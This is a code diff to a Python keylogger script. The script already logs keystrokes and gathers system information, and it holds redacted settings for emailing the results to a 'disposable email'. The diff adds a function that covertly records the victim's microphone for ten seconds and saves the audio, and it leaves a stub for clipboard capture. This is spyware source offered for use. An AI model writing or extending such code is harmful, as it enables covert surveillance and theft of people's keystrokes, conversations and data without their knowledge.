@@ -27,6 +27,11 @@ import pyperclip
 
 keys_information = "key_log.txt"
 system_information = "systeminfo.txt"
+clipboard_information = "clipboardinfo.txt"  # TO-DO
+audio_information = "audio.wav"
+
+microphone_time = 10
+
 email_address = "##redacted##"
 password = "##redacted##"  # use google app password
 toaddr = "##redacted##"  # disposable email of your choice
@@ -100,6 +105,24 @@ def computer_information():
 
 computer_information()
 
+# clipboard function TO-DO
+
+
+def microphone():
+    fs = 44100
+    seconds = microphone_time
+
+    sd.default.device = (2, None)
+
+    print("[*] Recording microphone...")
+    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
+    sd.wait()
+
+    write(file_path + extend + audio_information, fs, myrecording)
+    print("[*] Audio saved.")
+
+
+microphone()
 
 count = 0
 keys = []
